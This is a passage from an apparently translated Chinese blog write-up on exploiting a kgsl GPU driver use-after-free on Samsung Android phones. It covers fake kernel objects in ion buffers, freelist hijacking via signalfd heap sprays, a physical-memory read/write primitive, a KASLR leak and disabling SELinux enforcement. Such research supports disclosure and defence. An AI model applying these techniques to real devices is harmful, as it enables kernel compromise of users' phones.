<p>可以看到<code>node</code>字段是<code>kgsl_timeline_fence</code>中的最后一个字段，而为了构建这个漏洞，只需要用受控数据替换<code>base</code>。如果用部分对象替换，上述问题就会很容易解决了。在没有自动变量初始化的情况下，如果只将释放的<code>kgsl_timeline_fence</code>替换成一个<code>dma_fence</code>大小的对象，那么字段<code>timeline</code>和<code>node</code>将保持不变，并包含有效数据。这将导致<code>node</code>中的下一个指针有效，并允许<code>kgsl_ioctl_timeline_destroy</code>的循环正常退出。然而，在自动变量初始化的情况下，即使把释放的<code>kgsl_timeline_fence</code>对象换成一个更小的对象，整个内存块也会首先被设置为零，抹去<code>kgsl_timeline</code>和<code>node</code>，这意味着必须伪造<code>node</code>字段，以便：</p>
<ol>
<li>下一个指针指向一个有效的地址，以避免立即崩溃，事实上，不止如此，它需要指向一个对象，这个对象是另一个假的<code>kgsl_timeline_fence</code>，可以被循环中的函数（<code>dma_fence_set_error</code>、<code>dma_fence_signal_locked</code>和<code>dma_fence_put</code>）操作而不崩溃。这意味着需要制作更多的假对象。</li>
<li>这些假的<code>kgsl_timeline_fence</code>对象中的一个下一个指针指向了退出循环的<code>temp</code>列表，这是一个堆栈分配的变量。</li>
</ol>
<p>第一个要求并不难，因为现在可以使用<code>ion</code>缓冲器来创建这些假的<code>kgsl_timeline_fence</code>对象。然而，第二个要求则要难得多：</p>
<p><img src="/Users/DarkMatter/Documents/Hacking/Blog/source/pictures/Kernel-4.webp" alt="Kernel-4"></p>
<p>这将导致一个无限循环，并耽误CPU。虽然它很难看，但假的对象应该能解决取消引用的问题并避免崩溃，所以它可能不是一个致命的问题。不幸的是，由于该循环在自旋锁内运行，在运行了一小段时间后，看门狗似乎会将其标记为占用CPU的问题并触发内核恐慌。所以，需要找到一种方法来退出循环，而且是快速退出。</p>
<p>看看函数<code>dma_fence_signal_locked</code>：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">dma_fence_signal_locked</span><span class="params">(<span class="keyword">struct</span> dma_fence *fence)</span></span><br><span class="line">&#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">cb_list</span>;</span></span><br><span class="line">    ...</span><br><span class="line">    <span class="comment">/* Stash the cb_list before replacing it with the timestamp */</span></span><br><span class="line">    list_replace(&amp;fence-&gt;cb_list, &amp;cb_list);             <span class="comment">//&lt;-- 1.</span></span><br><span class="line">    ...</span><br><span class="line">    list_for_each_entry_safe(cur, tmp, &amp;cb_list, node) &#123; <span class="comment">//&lt;-- 2.</span></span><br><span class="line">        INIT_LIST_HEAD(&amp;cur-&gt;node);</span><br><span class="line">        cur-&gt;func(fence, cur);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这个函数将对列表<code>temp</code>中的每个假<code>dma_fence</code>（原始已释放的和替换的<code>dma_fence</code>，加上它在<code>ion buffer</code>中链接的那些）运行。如前所述，如果运行上面2处的代码，那么内核可能会崩溃，因为不能提供一个有效的<code>func</code>，所以还是避免运行这个路径。</p>
<p>为了能够运行这段代码而不是上面2中的循环代码，需要将<code>fence.cb_list</code>初始化为一个空列表，这样它的<code>next</code>和<code>prev</code>都指向它自己。这对于被漏洞释放的初始假<code>dma_fence</code>来说是不可能的，因为<code>fence</code>的地址以及<code>fence.cb_list</code>是未知的，所以不得不对这个第一个假对象完全避免使用<code>list_replace</code>代码。然而，由于随后链接到它的假<code>dma_fence</code>对象是在一个已知地址的<code>ion</code>缓冲区中，现在可以为这些对象创建一个空的<code>cb_list</code>，将<code>next</code>和<code>prev</code>指针都设置为<code>fence.cb_list</code>字段的地址。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">void</span> <span class="title function_">list_replace</span><span class="params">(<span class="keyword">struct</span> list_head *old,</span></span><br><span class="line"><span class="params">                <span class="keyword">struct</span> list_head *new)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">//old-&gt;next = &amp;(fence-&gt;cb_list)</span></span><br><span class="line">    new-&gt;next = old-&gt;next;</span><br><span class="line">    <span class="comment">//new-&gt;next = &amp;(fence-&gt;cb_list) =&gt; fence-&gt;cb_list.prev = &amp;cb_list</span></span><br><span class="line">    new-&gt;next-&gt;prev = new;</span><br><span class="line">    <span class="comment">//new-&gt;prev = fence-&gt;cb_list.prev =&gt; &amp;cb_list</span></span><br><span class="line">    new-&gt;prev = old-&gt;prev;</span><br><span class="line">    <span class="comment">//&amp;cb_list-&gt;next = &amp;cb_list</span></span><br><span class="line">    new-&gt;prev-&gt;next = new;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在<code>list_replace</code>之后，堆栈变量<code>cb_list</code>的地址已经被写入了<code>fence-&gt;cb_list.prev</code>，它在<code>ion</code>缓冲区的某处。由于<code>ion</code>缓冲区被映射到了用户空间，可以通过轮询<code>ion</code>缓冲区简单地读取这个地址。由于<code>dma_fence_signal_locked</code>是在堆栈变量<code>temp</code>被分配后在<code>kgsl_ioctl_timeline_destroy</code>里面运行。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">long</span> <span class="title function_">kgsl_ioctl_timeline_destroy</span><span class="params">(<span class="keyword">struct</span> kgsl_device_private *dev_priv,</span></span><br><span class="line"><span class="params">        <span class="type">unsigned</span> <span class="type">int</span> cmd, <span class="type">void</span> *data)</span></span><br><span class="line">&#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">temp</span>;</span></span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    spin_lock_irq(&amp;timeline-&gt;lock);</span><br><span class="line">    list_for_each_entry_safe(fence, tmp, &amp;temp, node) &#123;</span><br><span class="line">        dma_fence_set_error(&amp;fence-&gt;base, -ENOENT);</span><br><span class="line">        <span class="comment">//cb_list, is a stack variable allocated inside `dma_fence_signal_locked`</span></span><br><span class="line">        dma_fence_signal_locked(&amp;fence-&gt;base);</span><br><span class="line">        dma_fence_put(&amp;fence-&gt;base);</span><br><span class="line">    &#125;</span><br><span class="line">    spin_unlock_irq(&amp;timeline-&gt;lock);</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>有了<code>cb_list</code>的地址，就可以计算<code>temp</code>的地址，（它与<code>cb_list</code>的地址有一个固定的偏移），所以通过轮询<code>cb_list</code>的地址，然后用它来计算<code>temp</code>的地址，并把它写回<code>ion</code>缓冲区中一个假的<code>kgsl_timeline_fence</code>对象的下一个指针，可以在看门狗咬人之前退出循环。</p>
<p><img src="/Users/DarkMatter/Documents/Hacking/Blog/source/pictures/Kernel-5.webp" alt="Kernel-5"></p>
<h2 id="Hijacking-the-freelist"><a href="#Hijacking-the-freelist" class="headerlink" title="Hijacking the freelist"></a>Hijacking the freelist</h2><p><code>dma_fence_put</code>将减少假对象的<code>refcount</code>，如果<code>refcount</code>达到0，它将调用<code>dma_fence_free</code>，然后用<code>kfree_rcu</code>释放该对象。现在假设假对象将被<code>kfree_rcu</code>释放。通过用另一个对象再次替换这个假对象，就可以得到对同一个对象的两个引用，将能够在任何时候使用这些对象的句柄释放这些对象。一般的想法是，当一个内存块被释放时，指向下一个自由块的<code>freelist</code>指针将被写入内存块的前8字节。如果从一个句柄中释放对象，然后用另一个句柄修改这个被释放的对象的前8字节，那么就可以劫持<code>freelist</code>指针，让它指向选择的地址，这就是下一次分配将发生的地方。</p>
<p>为了能够修改对象分配后的前8字节，这里使用“<a target="_blank" rel="noopener" href="https://googleprojectzero.blogspot.com/2020/02/mitigations-are-attack-surface-too.html">Mitigations are attack surface too</a>”中使用的<code>signalfd</code>对象。<code>signalfd</code>系统调用分配了一个8字节的对象来存储<code>signalfd</code>文件的掩码，这个掩码可以由用户指定，但有一些小限制。所分配对象的寿命与返回给用户的<code>signalfd</code>文件相联系，可以通过关闭该文件轻松控制。此外，这个对象的前8个字节可以通过用不同的掩码再次调用<code>signalfd</code>来改变。</p>
<p>为了劫持freelist指针：</p>
<ol>
<li>触发UAF bug，用一个通过<code>sendmsg</code>分配的假的<code>dma_fence</code>对象替换已释放的对象，这样<code>dma_fence_free</code>将被调用，用<code>kfree_rcu</code>释放这个假对象。</li>
<li>用<code>signalfd</code>堆喷，在<code>sendmsg</code>对象被释放后，在同一地址分配另一个对象。</li>
<li>释放<code>sendmsg</code>对象，使<code>freelist</code>指针被写入第二步中<code>signalfd</code>对象的掩码。</li>
<li>修改<code>signalfd</code>对象的掩码，使<code>freelist</code>指针现在指向一个指定的地址，然后再次堆喷，在该地址分配对象。</li>
</ol>
<p>如果将<code>freelist</code>指针的地址设置为我们控制的<code>ion</code>缓冲区的地址，那么随后的分配将把对象放入<code>ion</code>缓冲区，然后可以随时访问和修改，即，可以在一个有读和写权限的区域内伪造自己的内核堆。</p>
<p><img src="/Users/DarkMatter/Documents/Hacking/Blog/source/pictures/Kernel-6.webp" alt="Kernel-6"></p>
<p>这个方案的主要障碍来自于<code>kfree_rcu</code>和运行<code>dma_fence_put</code>的<code>CPU</code>在调用<code>kfree_rcu</code>后将暂时陷入一个繁忙的循环。回顾上一节，在能够通过将 <code>temp</code> 列表的地址写入假的<code>kgsl_timeline_fence::node</code>对象的下一个指针来退出循环之前，这个循环将一直运行。这意味着，一旦调用<code>kfree_rcu</code>，<code>dma_fence_put</code>被退出，该循环将继续处理运行<code>kfree_rcu</code>的<code>CPU</code>上的其他假<code>dma_fence</code>对象。正如前面所解释的，<code>kfree_rcu</code>不会立即释放一个对象，而是延迟移除。大多数情况下，释放将实际发生在调用<code>kfree_rcu</code>的同一个<code>CPU</code>上。然而，在这种情况下，由于运行<code>kfree_rcu</code>的<code>CPU</code>因为运行循环而在 <code>spinlock</code> 中保持繁忙，对象几乎肯定不会在同一个<code>CPU</code>上被释放。相反，一个不同的<code>CPU</code>将被用来释放该对象。这导致了一个问题，因为对象替换的可靠性取决于用于释放对象的<code>CPU</code>。当一个对象在<code>CPU</code>上被释放时，内存分配器将把它放在每个<code>CPU</code>的缓存中。紧接着在同一<code>CPU</code>上进行的分配将首先在<code>CPU</code>缓存中寻找空闲空间，并且很可能会替换那个新释放的对象。然而，如果分配发生在不同的<code>CPU</code>上，那么它很可能会替换不同<code>CPU</code>缓存中的一个对象，而不是新释放的对象。不知道哪个<code>CPU</code>负责释放对象，再加上对象被释放的时间不确定（因为<code>kfree_rcu</code>引入的延迟），意味着可能很难替换对象。然而，在实践中，简单地运行一个循环，在每个<code>CPU</code>上喷射物体，并以一定的间隔重复喷射，以考虑到时间上的不确定性（成功率大于70%）。</p>
<p>漏洞中使用的另一个小修改是，在<code>sendmsg</code>对象被释放后，用另一轮<code>signalfd</code>堆喷来替换它们。这是为了确保这些<code>sendmsg</code>对象不会意外地被不控制的对象所替换，从而干扰了漏洞的利用，同时也是为了更容易识别实际被破坏的对象。</p>
<p>现在可以劫持<code>freelist</code>并将新的对象分配重定向到可以随时自由访问的<code>ion</code>缓冲区，现在需要将其变成一个任意的内存读写原语。</p>
<h2 id="The-Device-Memory-Mirroring-Attack"><a href="#The-Device-Memory-Mirroring-Attack" class="headerlink" title="The Device Memory Mirroring Attack"></a>The Device Memory Mirroring Attack</h2><p>内核驱动经常需要将内存映射到用户空间，因此，经常有一些结构包含指向<code>page</code>结构或<code>sg_table</code>结构的指针。这些结构通常包含指向页面的指针，这些页面将被映射到用户空间，例如，当调用<code>mmap</code>时。这使得它们成为非常好的破坏目标。例如，<code>ion_buffer</code>对象在所有的Android设备上都可用。它有一个<code>sg_table</code>结构，包含了当<code>mmap</code>被使用时将被映射到用户空间的页面的信息。</p>
<p>除了可以广泛使用和从不可信任的应用程序中访问外，<code>ion_buffer</code>对象还解决了一些其他问题，所以在下面的内容中，将使用上面的<code>freelist</code>劫持原语，在有任意读写权限的<code>ion</code>缓冲区备份存储中分配一个<code>ion_buffer</code>结构。通过这样做，可以随意破坏所有被分配的 <code>ion_buffer</code> 结构中的数据。为了避免混淆，从现在开始，将使用术语 “假内核堆 “来表示用作假内核堆的<code>ion</code>缓冲区备份存储，以及在假内核堆中分配的用作破坏目标的结构的<code>ion_buffer</code>。</p>
<p>这里的总体想法是，通过在假的内核堆中分配<code>ion_buffer</code>结构，将能够修改<code>ion_buffer</code>结构，用受控数据替换其<code>sg_table</code>。<code>sg_table</code>结构包含一个<code>scatterlist</code>结构，表示支持<code>ion_buffer</code>结构的页面集合。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sg_table</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">scatterlist</span> *<span class="title">sgl</span>;</span>    <span class="comment">/* the list */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> nents;     <span class="comment">/* number of mapped entries */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> orig_nents;    <span class="comment">/* original size of list */</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">scatterlist</span> &#123;</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span>   page_link;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span>    offset;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span>    length;</span><br><span class="line">    <span class="type">dma_addr_t</span>  dma_address;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_NEED_SG_DMA_LENGTH</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span>    dma_length;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p><code>scatterlist</code>中的<code>page_link</code>字段是一个页面指针的编码形式，表明<code>ion_buffer</code>结构的备份存储所在的实际页面。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="keyword">struct</span> page *<span class="title function_">sg_page</span><span class="params">(<span class="keyword">struct</span> scatterlist *sg)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_DEBUG_SG</span></span><br><span class="line">    BUG_ON(sg_is_chain(sg));</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    <span class="keyword">return</span> (<span class="keyword">struct</span> page *)((sg)-&gt;page_link &amp; ~(SG_CHAIN | SG_END));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>当<code>mmap</code>被调用时，由<code>page_link</code>编码的页面将被映射到用户空间。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">ion_heap_map_user</span><span class="params">(<span class="keyword">struct</span> ion_heap *heap, <span class="keyword">struct</span> ion_buffer *buffer,</span></span><br><span class="line"><span class="params">              <span class="keyword">struct</span> vm_area_struct *vma)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sg_table</span> *<span class="title">table</span> =</span> buffer-&gt;sg_table;</span><br><span class="line">    ...</span><br><span class="line">    for_each_sg(table-&gt;sgl, sg, table-&gt;nents, i) &#123;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">page</span> =</span> sg_page(sg);</span><br><span class="line">        ...</span><br><span class="line">        <span class="comment">//Maps pages to user space</span></span><br><span class="line">        ret = remap_pfn_range(vma, addr, page_to_pfn(page), len,</span><br><span class="line">                      vma-&gt;vm_page_prot);</span><br><span class="line">        ...</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>由于 <code>page</code> 指针只是页面物理地址的逻辑移位，然后是一个恒定的线性偏移（见<a target="_blank" rel="noopener" href="https://git.codelinaro.org/clo/la/kernel/msm-5.4/-/blob/5e3cf80f1b6a12fcf54b007f3c9f235f35b9b7f1/arch/arm64/include/asm/memory.h#L285"><code>phys_to_page</code></a>的定义），能够控制<code>page_link</code>就可以把一个任意的页面映射到用户空间。对于许多设备来说，这就足以实现任意的内核内存读写，因为内核映像是在一个固定的物理地址上映射的（<code>KASLR</code>随机化了这个固定物理地址的虚拟地址偏移），所以在处理物理地址的时候不需要担心<code>KASLR</code>。</p>
<p><img src="/Users/DarkMatter/Documents/Hacking/Blog/source/pictures/Kernel-7.webp" alt="Kernel-7"></p>
<p>然而，三星设备以不同的方式进行<code>KASLR</code>。内核镜像的物理地址不是映射到一个固定的物理地址，而是随机化的（严格来说，是内核认为的中间物理地址，这不是真正的物理地址，而是由管理程序给出的虚拟地址）。所以在我们的案例中，仍然需要泄露一个地址来打败<code>KASLR</code>。然而，有了假的内核堆，这就相当容易实现了。一个<code>ion_buffer</code>对象包含一个指向<code>ion_heap</code>的指针，它负责为<code>ion_buffer</code>分配后备存储。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ion_buffer</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">list</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ion_heap</span> *<span class="title">heap</span>;</span></span><br><span class="line">    ...</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>虽然<code>ion_heap</code>在内核镜像中不是一个全局对象，但每个<code>ion_heap</code>都包含一个<code>ion_heap_ops</code>字段，它指向特定<code>ion_heap</code>对象的相应 <code>vtable</code>。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ion_heap</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">plist_node</span> <span class="title">node</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">enum</span> <span class="title">ion_heap_type</span> <span class="title">type</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ion_heap_ops</span> *<span class="title">ops</span>;</span></span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>上面的<code>ops</code>字段是内核镜像中的一个全局对象。如果能够读取<code>ion_buffer-&gt;heap-&gt;ops</code>，那么也能够得到一个地址来打败<code>KASLR</code>，将内核镜像中的地址翻译成物理地址。这可以按以下方法进行。</p>
<ol>
<li>首先在假的内核堆中找到<code>ion_buffer</code>结构的位置。这可以通过<code>ion_buffer</code>中的<code>flags</code>字段来完成。</li>
</ol>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ion_buffer</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">list</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ion_heap</span> *<span class="title">heap</span>;</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> flags;</span><br><span class="line">    ...</span><br></pre></td></tr></table></figure>

<p>这是在创建<code>ion_buffer</code>时从<code>ION_IOC_ALLOC</code> <code>ioctl</code>的参数中传递的4个字节的值。可以将这些设置为特定的 “魔法 “值，并在假的内核堆中搜索它们。</p>
<ol start="2">
<li>一旦找到<code>ion_buffer</code>结构，读取其堆指针。这将是内核镜像之外的低内存区域的一个虚拟地址，因此，它的物理地址可以通过应用常数偏移来获得。</li>
<li>一旦获得相应的<code>ion_heap</code>对象的物理地址，修改<code>ion_buffer</code>的<code>sg_table</code>，使其后备存储指向包含<code>ion_heap</code>的页面。</li>
<li>在<code>ion_buffer</code>的文件描述符上调用<code>mmap</code>，这将把包含<code>ion_heap</code>的页面映射到用户空间。然后可以直接从用户空间读取该页以获得<code>OPS</code>指针，这将提供<code>KASLR</code>的偏移。</li>
</ol>
<p><code>ion_buffer</code>结构的使用也解决了另一个问题。虽然假内核堆很方便，但它并不完美。每当假内核堆中的一个对象被释放时，<code>kfree</code>将使用<code>PageSlab</code>检查来检查包含该对象的页面是否是来自<code>SLUB</code>分配器的单页<code>slab</code>。如果检查失败，那么<code>PageCompound</code>检查将被执行，以检查该页是否是一个更大的<code>slab</code>的一部分。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">kfree</span><span class="params">(<span class="type">const</span> <span class="type">void</span> *x)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">page</span>;</span></span><br><span class="line">    <span class="type">void</span> *object = (<span class="type">void</span> *)x;</span><br><span class="line"></span><br><span class="line">    trace_kfree(_RET_IP_, x);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (unlikely(ZERO_OR_NULL_PTR(x)))</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">    page = virt_to_head_page(x);</span><br><span class="line">    <span class="keyword">if</span> (unlikely(!PageSlab(page))) &#123;     <span class="comment">//&lt;-------- check if the page allocated is a single page slab</span></span><br><span class="line">        <span class="type">unsigned</span> <span class="type">int</span> order = compound_order(page);</span><br><span class="line"></span><br><span class="line">        BUG_ON(!PageCompound(page));     <span class="comment">//&lt;-------- check if the page is allocated as part of a multipage slab</span></span><br><span class="line">        ...</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>由于这些检查是在包含页面元数据的页面结构本身上进行的，因此只要有对象被释放，它们就会失败并导致内核崩溃。这可以通过使用现在拥有的任意读写原语来覆盖页面结构中各自的元数据来解决（对应于物理地址的页面结构的地址只是物理地址的逻辑移动，然后是固定偏移量的转换，所以可以将包含页面结构的页面映射到用户空间并修改其内容）。然而，如果能够确保占据假内核堆的对象永远不会被释放，那就更简单了。在<code>ion_buffer</code>结构被释放之前，会调用<code>ion_buffer_destroy</code>。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">ion_buffer_destroy</span><span class="params">(<span class="keyword">struct</span> ion_device *dev, <span class="keyword">struct</span> ion_buffer *buffer)</span></span><br><span class="line">&#123;</span><br><span class="line">    ...</span><br><span class="line">    heap = buffer-&gt;heap;</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">if</span> (heap-&gt;flags &amp; ION_HEAP_FLAG_DEFER_FREE)</span><br><span class="line">        ion_heap_freelist_add(heap, buffer);    <span class="comment">//&lt;--------- does not free immediately</span></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        ion_buffer_release(buffer);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>如果<code>ion_heap</code>包含标志<code>ION_HEAP_FLAG_DEFER_FREE</code>，那么<code>ion_buffer</code>不会立即被释放，而是通过<code>ion_heap_freelist_add</code>被添加到<code>ion_heap</code>的<code>free_list</code>。添加到这个列表中的<code>ion_buffer</code>对象只有在以后需要的时候才会被释放，而且只有在<code>ION_HEAP_FLAG_DEFER_FREE</code>标志被设置的情况下。当然，通常情况下，<code>ION_HEAP_FLAG_DEFER_FREE</code>在<code>ION_heap</code>的生命周期内不会改变，但是通过我们的任意内存写入基元，可以简单地将<code>ION_HEAP_FLAG_DEFER_FREE</code>添加到<code>ION_heap-&gt;flags</code>中，释放<code>ION_buffer</code>，然后再次移除<code>ION_HEAP_FLAG_DEFER_FREE</code>，<code>ION_buffer</code>将只是停留在<code>ION_heap</code>的<code>freelist</code>中而永远不会被释放。此外，包含<code>ion_heap</code>对象的页面已经被映射，目的是为了绕过<code>KASLR</code>，所以切换该标志是相当微不足道的。通过喷洒假的内核堆，使其充满了<code>ion_buffer</code>对象及其附属物，可以确保这些对象永远不会被释放，避免内核崩溃。</p>
<h2 id="Bypassing-SELinux"><a href="#Bypassing-SELinux" class="headerlink" title="Bypassing SELinux"></a>Bypassing SELinux</h2><p>当<code>SELinux</code>被启用时，它可以在 <code>permissive</code> 模式或 <code>enforcing</code> 模式下运行。当处于 <code>permissive</code> 模式时，它将只审计和记录未经授权的访问，但不会阻止它们。<code>SELinux</code>的运行模式是由<code>selinux_enforcing</code>变量控制的。如果这个变量为零，那么<code>SELinux</code>就以 <code>permissive</code> 模式运行。通常，对系统安全至关重要的变量会受到三星内核数据保护（KDP）的保护，通过使用<code>__kdp_ro</code>或<code>__rkp_ro</code>属性将其标记为只读。这个属性表明该变量处于只读页面，其修改受到管理程序调用的保护。然而，在5.x分支的高通内核中，三星似乎忘记了保护这个变量（<a target="_blank" rel="noopener" href="https://securitylab.github.com/research/qualcomm_npu/">又是这样吗</a>！）。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//In security/selinux/hooks.c</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_SECURITY_SELINUX_DEVELOP</span></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> selinux_enforcing_boot;</span><br><span class="line"><span class="type">int</span> selinux_enforcing;</span><br></pre></td></tr></table></figure>

<p>所以，可以直接将<code>selinux_enforcing</code>覆盖为零，并将<code>SELinux</code>设置为<code>permissive</code>模式。虽然还有其他绕过<code>SELinux</code>的方法（比如Valentina Palmiotti在这个<a target="_blank" rel="noopener" href="https://github.com/chompie1337/s8_2019_2215_poc/blob/master/poc/selinux_bypass.c">漏洞</a>中使用的方法），但此时的捷径更受欢迎，所以将直接设置<code>selinux_enforcing</code>变量。</p>
